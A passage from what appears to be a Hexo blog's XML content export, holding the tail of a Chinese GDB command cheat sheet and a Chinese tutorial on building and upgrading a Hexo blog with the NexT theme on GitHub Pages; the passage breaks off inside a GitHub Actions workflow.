9、当此选项打开时，GDB将用比较规整的格式来显示虚函数表时。其默认是关闭的。</span><br><span class="line">(gdb) set print vtbl &lt;on/off&gt;</span><br><span class="line">(gdb) show print vtbl               # 查看虚函数显示格式的选项。</span><br></pre></td></tr></table></figure>

<h2 id="历史纪录"><a href="#历史纪录" class="headerlink" title="历史纪录"></a>历史纪录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当你用GDB的print查看程序运行时的数据时，你每一个print都会被GDB记录下来。GDB会以$1, $2, $3 .....这样的方式为你每一个print命令编上号。于是，你可以使用这个编号访问以前的表达式，如$1。这个功能所带来的好处是，如果你先前输入了一个比较长的表达式，如果你还想查看这个表达式的值，你可以使用历史记录来访问，省去了重复输入。</span><br></pre></td></tr></table></figure>
<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 你可以在GDB的调试环境中定义自己的变量，用来保存一些调试程序中的运行数据。要定义一个GDB的变量很简单只需。 使用GDB的set命令。GDB的环境变量和UNIX一样，也是以$起头。如：</span><br><span class="line">(gdb) set $foo = *object_ptr</span><br><span class="line"># 使用环境变量时，GDB会在你第一次使用时创建这个变量，而在以后的使用中，则直接对其賦值。环境变量没有类型，你可以给环境变量定义任一的类型。包括结构体和数组。</span><br><span class="line">(gdb) show convenience</span><br><span class="line"># 该命令查看当前所设置的所有的环境变量。这是一个比较强大的功能，环境变量和程序变量的交互使用，将使得程序调试更为灵活便捷。例如：</span><br><span class="line">(gdb) set $i = 0</span><br><span class="line">(gdb) print bar[$i++]-&gt;contents</span><br><span class="line"># 于是，当你就不必，print bar[0]-&gt;contents, print bar[1]-&gt;contents地输入命令了。输入这样的命令后，只用敲回车，重复执行上一条语句，环境变量会自动累加，从而完成逐个输出的功能。</span><br></pre></td></tr></table></figure>

<h2 id="查看寄存器"><a href="#查看寄存器" class="headerlink" title="查看寄存器"></a>查看寄存器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 寄存器中放置了程序运行时的数据，比如程序当前运行的指令地址（ip），程序的当前堆栈地址（sp）等等。你同样可以使用print命令来访问寄存器的情况，只需要在寄存器名字前加一个$符号就可以了。如：p $eip。</span><br><span class="line">(gdb) info registers        # 查看寄存器状态(除浮点寄存器)</span><br><span class="line">(gdb) info all-registers    # 查看所有寄存器状态</span><br><span class="line">(gdb) info registers regname# 查看指定寄存器状态，如：info rbp</span><br></pre></td></tr></table></figure>

<h2 id="修改程序的执行"><a href="#修改程序的执行" class="headerlink" title="修改程序的执行"></a>修改程序的执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 一旦使用GDB挂上被调试程序，当程序运行起来后，你可以根据自己的调试思路来动态地在GDB中更改当前被调试程序的运行线路或是其变量的值，这个强大的功能能够让你更好的调试你的程序，比如，你可以在程序的一次运行中走遍程序的所有分支。</span><br><span class="line"></span><br><span class="line"># 一、修改变量值</span><br><span class="line"># 修改被调试程序运行时的变量值，在GDB中很容易实现，使用GDB的print命令即可完成。如：</span><br><span class="line">(gdb) print x=4</span><br><span class="line"># x=4这个表达式是C/C++的语法，意为把变量x的值修改为4，如果你当前调试的语言是Pascal，那么你可以使用Pascal的语法：x:=4。</span><br><span class="line"># 在某些时候，很有可能你的变量和GDB中的参数冲突，如：</span><br><span class="line">(gdb) whatis width</span><br><span class="line">type = double</span><br><span class="line">(gdb) p width</span><br><span class="line">$4 = 13</span><br><span class="line">(gdb) set width=47</span><br><span class="line">Invalid syntax in expression.</span><br><span class="line"># 因为，set width是GDB的命令，所以，出现了“Invalid syntax in expression”的设置错误，此时，你可以使用set</span><br><span class="line"># var命令来告诉GDB，width不是你GDB的参数，而是程序的变量名，如：</span><br><span class="line">(gdb) set var width=47</span><br><span class="line"># 另外，还可能有些情况，GDB并不报告这种错误，所以保险起见，在你改变程序变量取值时，最好都使用set var格式的GDB命令。</span><br></pre></td></tr></table></figure>

<h2 id="跳转执行"><a href="#跳转执行" class="headerlink" title="跳转执行"></a>跳转执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 一般来说，被调试程序会按照程序代码的运行顺序依次执行。GDB提供了乱序执行的功能，也就是说，GDB可以修改程序的执行顺序，可以让程序执行随意跳跃。这个功能可以由GDB的jump命令来完：</span><br><span class="line">(gdb) jump &lt;linespec&gt;</span><br><span class="line"># 指定下一条语句的运行点。&lt;linespce&gt;可以是文件的行号，可以是file:line格式，可以是+num这种偏移量格式。表式着下一条运行语句从哪里开始。</span><br><span class="line">(gdb) jump &lt;address&gt;</span><br><span class="line"># 这里的&lt;address&gt;是代码行的内存地址。注意，jump命令不会改变当前的程序栈中的内容，所以，当你从一个函数跳到另一个函数时，当函数运行完返回时进行弹栈操作时必然会发生错误，可能结果还是非常奇怪的，甚至于产生程序Core Dump。所以最好是同一个函数中进行跳转。</span><br><span class="line"># 熟悉汇编的人都知道，程序运行时，有一个寄存器用于保存当前代码所在的内存地址。所以，jump命令也就是改变了这个寄存器中的值。于是，你可以使用“set $pc”来更改跳转执行的地址。如：</span><br><span class="line">(gdb) set $pc = 0x485</span><br></pre></td></tr></table></figure>

<h2 id="强制函数返回"><a href="#强制函数返回" class="headerlink" title="强制函数返回"></a>强制函数返回</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果你的调试断点在某个函数中，并还有语句没有执行完。你可以使用return命令强制函数忽略还没有执行的语句并返回。</span><br><span class="line">(gdb) return</span><br><span class="line">(gdb) return &lt;expression&gt;</span><br><span class="line"># 使用return命令取消当前函数的执行，并立即返回，如果指定了&lt;expression&gt;，那么该表达式的值会被认作函数的返回值。</span><br></pre></td></tr></table></figure>

<h2 id="强制调用函数"><a href="#强制调用函数" class="headerlink" title="强制调用函数"></a>强制调用函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) call &lt;expr&gt;</span><br><span class="line"># 表达式中可以一是函数，以此达到强制调用函数的目的。并显示函数的返回值，如果函数返回值是void，那么就不显示。</span><br><span class="line"># 另一个相似的命令也可以完成这一功能——print，print后面可以跟表达式，所以也可以用他来调用函数，print和call的不同是，如果函数返回void，call则不显示，print则显示函数返回值，并把该值存入历史数据中。</span><br></pre></td></tr></table></figure>

<h2 id="GDB语言环境"><a href="#GDB语言环境" class="headerlink" title="GDB语言环境"></a>GDB语言环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) show language</span><br><span class="line"># 查看当前的语言环境。如果GDB不能识为你所调试的编程语言，那么，C语言被认为是默认的环境。</span><br><span class="line">(gdb) info frame</span><br><span class="line"># 查看当前函数的程序语言。</span><br><span class="line">(gdb) info source</span><br><span class="line"># 查看当前文件的程序语言。如果GDB没有检测出当前的程序语言，那么你也可以手动设置当前的程序语言。使用set language命令即可做到。当set language命令后什么也不跟的话，你可以查看GDB所支持的语言种类：</span><br><span class="line">(gdb) set language</span><br><span class="line">The currently understood settings are:</span><br><span class="line">local or auto Automatic setting based on source file</span><br><span class="line">c Use the C language</span><br><span class="line">c++ Use the C++ language</span><br><span class="line">asm Use the Asm language</span><br><span class="line">chill Use the Chill language</span><br><span class="line">fortran Use the Fortran language</span><br><span class="line">java Use the Java language</span><br><span class="line">modula-2 Use the Modula-2 language</span><br><span class="line">pascal Use the Pascal language</span><br><span class="line">scheme Use the Scheme language</span><br><span class="line"># 于是你可以在set language后跟上被列出来的程序语言名，来设置当前的语言环境。</span><br></pre></td></tr></table></figure>

<h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) q/quit                # 退出GDB调试</span><br></pre></td></tr></table></figure>

<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) b                     # 敲入b按两次TAB键</span><br><span class="line">backtrace break bt</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Debug</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo｜快速搭建自己（Github）博客</title>
    <url>/2019/11/02/Hexo%EF%BD%9C%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%EF%BC%88Github%EF%BC%89%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><ul>
<li>安装<a href="https://nodejs.org/en/">nodejs</a></li>
<li>安装<a href="https://git-scm.com/">git</a></li>
<li>注册<a href="https://github.com/">github</a>账号</li>
</ul>
<h1 id="二、申请-github-博客"><a href="#二、申请-github-博客" class="headerlink" title="二、申请 github 博客"></a>二、申请 github 博客</h1><h2 id="1-创建-github-仓库"><a href="#1-创建-github-仓库" class="headerlink" title="1.创建 github 仓库"></a>1.创建 github 仓库</h2><p>创建一个新的 github 仓库，仓库名为<code>username.github.io</code>,其他选项可以默认。</p>
<img src="/2019/11/02/Hexo%EF%BD%9C%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%EF%BC%88Github%EF%BC%89%E5%8D%9A%E5%AE%A2/new_repository.png" class="">

<p>创建按仓库成功后，进入设置页面 GitHub Pages 选项，出现如下界面则表示博客页面创建成功。</p>
<img src="/2019/11/02/Hexo%EF%BD%9C%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%EF%BC%88Github%EF%BC%89%E5%8D%9A%E5%AE%A2/github_pages.png" class="">

<h1 id="三、安装-Hexo"><a href="#三、安装-Hexo" class="headerlink" title="三、安装 Hexo"></a>三、安装 Hexo</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<h2 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1. 初始化"></a>1. 初始化</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo  init blog</span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>

<h2 id="2-新建文章"><a href="#2-新建文章" class="headerlink" title="2. 新建文章"></a>2. 新建文章</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;Hello-Hexo&quot;</span></span><br></pre></td></tr></table></figure>

<p>会在根目录下 <code>source/_posts/</code> 生成 <code>Hello-Hexo.md</code> 文件，使用 markdown 编辑器非常方便。</p>
<h2 id="3-开启服务"><a href="#3-开启服务" class="headerlink" title="3. 开启服务"></a>3. 开启服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>会看到提示<code>INFO  Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop.</code> 代表博客已经正常运行，在浏览器打开<code>http://0.0.0.0:4000/</code> 即可预览博客的初始状态。</p>
<p>了解更多 Hexo 的信息和其他步骤请参考官网的<a href="https://hexo.io/zh-cn/docs/setup.html">这篇文档</a> 。</p>
<h1 id="四、配置-Hexo-与-Github-pages-进行关联"><a href="#四、配置-Hexo-与-Github-pages-进行关联" class="headerlink" title="四、配置 Hexo 与 Github pages 进行关联"></a>四、配置 Hexo 与 Github pages 进行关联</h1><h2 id="1-配置关联"><a href="#1-配置关联" class="headerlink" title="1. 配置关联"></a>1. 配置关联</h2><p>进入<code>Blog</code>目录，然后以文本编辑器打开 <code>_config.yml</code> 文件，修改 deploy 配置如下，rego 为 <code>CKCat.github.io.git</code> 仓库提交代码的 git 地址。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/CKCat/CKCat.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>

<h2 id="2-发布"><a href="#2-发布" class="headerlink" title="2. 发布"></a>2. 发布</h2><p>使用下面的命令进行发布：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean  <span class="comment"># 清除缓存</span></span><br><span class="line">hexo g      <span class="comment"># 生成本地发布文件夹</span></span><br><span class="line">hexo d      <span class="comment"># 发布到github pages上</span></span><br></pre></td></tr></table></figure>

<p>更多的 hexo 命令操作请参考<a href="https://hexo.io/zh-cn/docs/commands.html">Hexo 官方文档</a>即可。</p>
<h1 id="五、更换-NexT-主题"><a href="#五、更换-NexT-主题" class="headerlink" title="五、更换 NexT 主题"></a>五、更换 NexT 主题</h1><h2 id="1-下载主题"><a href="#1-下载主题" class="headerlink" title="1. 下载主题"></a>1. 下载主题</h2><p>在 Blog 目录运行下列命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<h2 id="2-设置主题"><a href="#2-设置主题" class="headerlink" title="2. 设置主题"></a>2. 设置主题</h2><p>克隆完成以后打开站点配置 <code>_config.yml</code>，找到 theme 字段，值改为<code>next</code>。<br>运行<code>hexo server --debug</code>，访问<code>http://0.0.0.0:4000/</code> 查看主题是否生效。</p>
<h2 id="3-配置主题"><a href="#3-配置主题" class="headerlink" title="3. 配置主题"></a>3. 配置主题</h2><p>常用的配置可以直接按照主题的官方<a href="http://theme-next.iissnan.com/">参考手册</a>配置。<br>下面介绍一下常用配置：</p>
<h3 id="1-标签云页面"><a href="#1-标签云页面" class="headerlink" title="1. 标签云页面"></a>1. 标签云页面</h3><ol>
<li><p>新建一个页面，命名为 tags。命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑刚新建的页面，将页面的类型设置为 tags，主题将自动为这个页面显示标签云。页面内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"></span><br><span class="line">title: 标签</span><br><span class="line"><span class="built_in">date</span>: 2019-11-01 11:46:23</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>注意：如果有启用多说 或者 Disqus 评论，默认页面也会带有评论。需要关闭的话，请添加字段 comments 并将值设置为 false，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: 标签</span><br><span class="line"><span class="built_in">date</span>: 2019-11-01 11:46:23</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">comments: <span class="literal">false</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
</li>
<li><p>在菜单中添加链接。编辑 <strong>主题配置文件</strong> ，添加 tags 到 menu 中，如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">home: /</span><br><span class="line">archives: /archives</span><br><span class="line">tags: /tags</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-分类页面"><a href="#2-分类页面" class="headerlink" title="2. 分类页面"></a>2. 分类页面</h3><ol>
<li><p>新建一个页面，命名为 categories。命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page categories</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑刚新建的页面，将页面的类型设置为 categories，主题将自动为这个页面显示所有分类。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line"><span class="built_in">date</span>: 2019-11-01 12:03:27</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>注意：如果有启用多说 或者 Disqus 评论，默认页面也会带有评论。需要关闭的话，请添加字段 comments 并将值设置为 false，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line"><span class="built_in">date</span>: 2019-11-01 12:03:27</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br><span class="line">comments: <span class="literal">false</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
</li>
<li><p>在菜单中添加链接。编辑 <strong>主题配置文件</strong> ，将 menu 中的 categories: &#x2F;categories 注释去掉，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">home: /</span><br><span class="line">categories: /categories</span><br><span class="line">archives: /archives</span><br><span class="line">tags: /tags</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="3-About-页面"><a href="#3-About-页面" class="headerlink" title="3. About 页面"></a>3. About 页面</h3><ol>
<li><p>新建一个 about 页面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page <span class="string">&quot;about&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p>菜单显示 about 链接，在 <strong>主题配置文件</strong> 设置中将 menu 中 about<br>前面的注释去掉即可。<br><code>   menu:   home: /   archives: /archives   tags: /tags   about: /about</code></p>
</li>
<li><p>友情链接编辑 <strong>站点配置文件</strong> 添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># title, chinese available</span><br><span class="line">links_title: Links</span><br><span class="line"># links</span><br><span class="line">links:</span><br><span class="line">MacTalk: http://macshuo.com/</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="4-腾讯公益-404-页面"><a href="#4-腾讯公益-404-页面" class="headerlink" title="4. 腾讯公益 404 页面"></a>4. 腾讯公益 404 页面</h3><p>简体中文增加腾讯公益 404 页面，寻找丢失儿童，让大家一起关注此项公益事业！效果如下 <a href="http://www.ixirong.com/404.html">http://www.ixirong.com/404.html</a></p>
<p>使用方法，新建 404.md 页面，放到主题的 source 目录下，内容如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-代码高亮主题"><a href="#5-代码高亮主题" class="headerlink" title="5. 代码高亮主题"></a>5. 代码高亮主题</h3><p>NexT 使用 <a href="https://github.com/chriskempson/tomorrow-theme">Tomorrow Theme0</a> 作为代码高亮，共有 5 款主题供你选择。<br>默认使用的是白色的 normal。</p>
<h3 id="6-站点建立时间"><a href="#6-站点建立时间" class="headerlink" title="6. 站点建立时间"></a>6. 站点建立时间</h3><p>这个时间将在站点的底部显示，例如<code>© 2013 - 2019</code>编辑 <strong>站点配置文件</strong>，新增字段 since。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">since: 2013</span><br></pre></td></tr></table></figure>

<h3 id="7-数学公式显示"><a href="#7-数学公式显示" class="headerlink" title="7. 数学公式显示"></a>7. 数学公式显示</h3><p>NexT 借助于 MathJax 来显示数学公式，此选项默认关闭。<br>编辑 <strong>主题配置文件</strong>，将 mathjax 设定为 true 即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MathJax Support</span><br><span class="line">mathjax: true</span><br></pre></td></tr></table></figure>

<p>ProTip: <a href="https://github.com/iissnan/hexo-theme-next/pull/363">使用七牛 CDN 来加速 MathJax 脚本的加载</a></p>
<h3 id="8-侧边栏社交链接"><a href="#8-侧边栏社交链接" class="headerlink" title="8. 侧边栏社交链接"></a>8. 侧边栏社交链接</h3><p>编辑 <strong>站点配置文件</strong> ，新增字段 social，然后添加社交站点名称与地址即可。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Social linkssocial:</span><br><span class="line">  github: https://github.com/your-user-name</span><br><span class="line">  twitter: https://twitter.com/your-user-name</span><br><span class="line">  weibo: http://weibo.com/your-user-name</span><br><span class="line">  douban: http://douban.com/people/your-user-name</span><br><span class="line">  zhihu: http://www.zhihu.com/people/your-user-name</span><br><span class="line">  # 等等</span><br></pre></td></tr></table></figure>

<h1 id="六、问题"><a href="#六、问题" class="headerlink" title="六、问题"></a>六、问题</h1><h2 id="1-hexo-引用本地图片无法显示"><a href="#1-hexo-引用本地图片无法显示" class="headerlink" title="1.hexo 引用本地图片无法显示"></a>1.hexo 引用本地图片无法显示</h2><h3 id="插件安装与配置"><a href="#插件安装与配置" class="headerlink" title="插件安装与配置"></a>插件安装与配置</h3><p><a href="https://github.com/cocowool/hexo-image-link">https://github.com/cocowool/hexo-image-link</a></p>
<p>首先我们需要安装一个图片路径转换的插件，这个插件名字是 hexo-image-link</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-image-link --save</span><br></pre></td></tr></table></figure>
<p>修改  <code>_config.next.yml</code> 配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo-asset-folder: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h1 id="hexo-升级"><a href="#hexo-升级" class="headerlink" title="hexo 升级"></a>hexo 升级</h1><p>由于最近安装了 NodeJS 14 导致无法使用旧版的 hexo，所以进行了一次升级，记录一下。</p>
<h2 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h2><p>Hexo 升级需要使用 <code>npm-check</code>、<code>npm-upgrade</code>、<code>npm-update</code> 按以下顺序逐步执行完成后，Hexo 版本及系统插件均会升级到最新。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//以下指令均在Hexo目录下操作，先定位到Hexo目录</span><br><span class="line">//查看当前版本，判断是否需要升级</span><br><span class="line">&gt; hexo version</span><br><span class="line"></span><br><span class="line">//全局升级hexo-cli</span><br><span class="line">&gt; npm i hexo-cli -g</span><br><span class="line"></span><br><span class="line">//再次查看版本，看hexo-cli是否升级成功</span><br><span class="line">&gt; hexo version</span><br><span class="line"></span><br><span class="line">//安装npm-check，若已安装可以跳过</span><br><span class="line">&gt; npm install -g npm-check</span><br><span class="line"></span><br><span class="line">//检查系统插件是否需要升级</span><br><span class="line">&gt; npm-check</span><br><span class="line"></span><br><span class="line">//安装npm-upgrade，若已安装可以跳过</span><br><span class="line">&gt; npm install -g npm-upgrade</span><br><span class="line"></span><br><span class="line">//更新package.json</span><br><span class="line">&gt; npm-upgrade</span><br><span class="line"></span><br><span class="line">//更新全局插件</span><br><span class="line">&gt; npm update -g</span><br><span class="line"></span><br><span class="line">//更新系统插件</span><br><span class="line">&gt; npm update --save</span><br><span class="line"></span><br><span class="line">//再次查看版本，判断是否升级成功</span><br><span class="line">&gt; hexo version</span><br></pre></td></tr></table></figure>

<h2 id="调整配置"><a href="#调整配置" class="headerlink" title="调整配置"></a>调整配置</h2><p>升级后别急着 <code>hexo g</code>，需要先调整站点配置文件 <code>hexo/_config.yml</code>，否则会报错。</p>
<p>以下是废弃的字段，需要重新配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deprecated</span></span><br><span class="line">external_link: <span class="literal">true</span>|<span class="literal">false</span></span><br><span class="line"><span class="comment"># New option</span></span><br><span class="line">external_link:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line">  field: site <span class="comment"># Apply to the whole site</span></span><br><span class="line">  exclude: <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deprecated</span></span><br><span class="line">use_date_for_updated: <span class="literal">true</span></span><br><span class="line"><span class="comment"># New option</span></span><br><span class="line"><span class="comment">## pdated_option supports &#x27;mtime&#x27;, &#x27;date&#x27;, &#x27;empty&#x27;</span></span><br><span class="line">updated_option: <span class="string">&#x27;mtime&#x27;</span></span><br></pre></td></tr></table></figure>

<p>其他字段可以看官方文档，我这里不关心就不设置了。</p>
<h2 id="NexT-8-x-跨版本升级"><a href="#NexT-8-x-跨版本升级" class="headerlink" title="NexT-8.x 跨版本升级"></a>NexT-8.x 跨版本升级</h2><p>升级完 hexo 为 5.4 以后， next 主题也需要进行升级。</p>
<p>通过 npm 方式安装新版：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//定位到hexo目录,npm安装主题</span><br><span class="line">&gt; npm install hexo-theme-next</span><br></pre></td></tr></table></figure>

<p>将 Next 主题配置文件 <code>node_modules/hexo-theme-next/_config.yml</code> 改名为 <code>_config.next.yml</code>, 复制到根目录（与 Hexo 站点配置文件<code>_config.yml</code> 在同一目录），这个文件的作用等同于旧版 <code>next.yml</code>，但优先级最高。这样做的好处是以后可以通过 npm 顺滑升级 Next 版本，不用担心配置文件被覆盖。相关字段的解释可以通过<a href="https://theme-next.js.org/docs/getting-started/">官方文档</a>查看，我这里主要说一下摘要设置和统计人数设置。</p>
<blockquote>
<p>参考：<a href="https://www.imczw.com/post/tech/hexo5-next8-updated.html">https://www.imczw.com/post/tech/hexo5-next8-updated.html</a></p>
</blockquote>
<h2 id="设置摘要"><a href="#设置摘要" class="headerlink" title="设置摘要"></a>设置摘要</h2><p>官方给的方法：</p>
<ol>
<li>使用 <code>&lt;!-- more --&gt;</code> 插入你想设置摘要的文本位置之后，这个方法也是官方推荐的。</li>
<li>在文件头设置 <code>description</code> 字段,内容即为摘要。</li>
</ol>
<p>这两种方法都比较麻烦，我这里使用了第三方插件设置摘要。直接安装插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-excerpt --save</span><br></pre></td></tr></table></figure>

<p>在 Hexo 站点配置文件<code>_config.yml</code> 添加下列字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">excerpt:</span><br><span class="line">  depth: 10</span><br><span class="line">  excerpt_excludes: []</span><br><span class="line">  more_excludes: []</span><br><span class="line">  hideWholePostExcerpts: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：<a href="https://github.com/chekun/hexo-excerpt">https://github.com/chekun/hexo-excerpt</a></p>
</blockquote>
<h2 id="统计人数设置"><a href="#统计人数设置" class="headerlink" title="统计人数设置"></a>统计人数设置</h2><p>统计人数可以直接通过设置 <code>_config.next.yml</code> 配置文件，将 <code>enable</code> 对应的值改为 <code>true</code> 即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Show Views / Visitors of the website / page with busuanzi.</span></span><br><span class="line"><span class="comment"># For more information: http://ibruce.info/2015/04/04/busuanzi/</span></span><br><span class="line">busuanzi_count:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  total_visitors: <span class="literal">true</span></span><br><span class="line">  total_visitors_icon: fa fa-user</span><br><span class="line">  total_views: <span class="literal">true</span></span><br><span class="line">  total_views_icon: fa fa-eye</span><br><span class="line">  post_views: <span class="literal">true</span></span><br><span class="line">  post_views_icon: far fa-eye</span><br></pre></td></tr></table></figure>

<h2 id="添加搜索插件"><a href="#添加搜索插件" class="headerlink" title="添加搜索插件"></a>添加搜索插件</h2><p>安装 hexo-generator-searchdb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<p>在 <code>_config.yml</code> 添加下面内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  content: <span class="literal">true</span></span><br><span class="line">  format: html</span><br></pre></td></tr></table></figure>

<p><code>_config.next.yml</code> 添加下列内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/next-theme/hexo-generator-searchdb</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  <span class="comment"># If auto, trigger search by changing input.</span></span><br><span class="line">  <span class="comment"># If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  trigger: auto</span><br><span class="line">  <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  top_n_per_article: 1</span><br><span class="line">  <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">  unescape: <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">  preload: <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://theme-next.js.org/docs/third-party-services/search-services.html">https://theme-next.js.org/docs/third-party-services/search-services.html</a></p>
<h2 id="利用-github-action-自动部署"><a href="#利用-github-action-自动部署" class="headerlink" title="利用 github action 自动部署"></a>利用 github action 自动部署</h2><p>参考：<a href="https://hexo.io/zh-cn/docs/github-pages">https://hexo.io/zh-cn/docs/github-pages</a> </p>
<p>最关键的一点是需要修改一下 <code>.github/workflows/pages.yml</code> 中的 GITHUB_TOKEN，使用自己添加的 TOKEN ，否则有随机出错的可能。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name: Pages</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">  push:</span><br><span class="line">    branches:</span><br><span class="line">      - main # default branch</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">  pages:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    permissions:</span><br><span class="line">      contents: write</span><br><span class="line">    steps:</span><br><span class="line">      - uses: actions/checkout@v2</span><br><span class="line">      - name: Use Node.js 16.x</span><br><span class="line">        uses: actions/setup-node@v2</span><br><span class="line">        with:</span><br><span class="line">          node-version: &quot;16&quot;</span><br><span class="line">      - name: Cache NPM dependencies</span><br><span class="line">        uses: actions/cache@v2</span><br><span class="line">        with:</span><br><span class="line">          path: node_modules</span><br><span class="line">          key: $&#123;&#123; runner.OS 